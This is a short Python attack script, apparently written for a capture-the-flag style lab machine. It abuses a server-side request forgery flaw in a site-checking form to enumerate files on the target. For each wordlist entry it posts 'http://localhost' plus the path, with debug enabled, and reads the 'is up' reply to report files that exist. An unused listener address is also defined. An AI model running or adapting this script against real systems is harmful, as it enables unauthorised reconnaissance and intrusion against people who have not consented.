import requests
from requests_toolbelt.utils import dump
from tqdm import tqdm

RHOST = 'http://10.10.11.177'
LHOST = 'http://10.10.16.5:9001'
FILES = 'files.txt'
# FILES = '/opt/wordlists/common.txt'

for dirname in ['/dev/', '/']:
    with open(FILES, 'r') as files:
        for f in tqdm(files.readlines(), leave=False):
            file = dirname + f.strip()
            data = {
                'site': 'http://localhost' + file,
                'debug': '1'
            }
            r = requests.post(RHOST, data=data)
            if '<font color=\'green\'>is up.' in r.text:
                print('[+] File found: {}'.format(file))
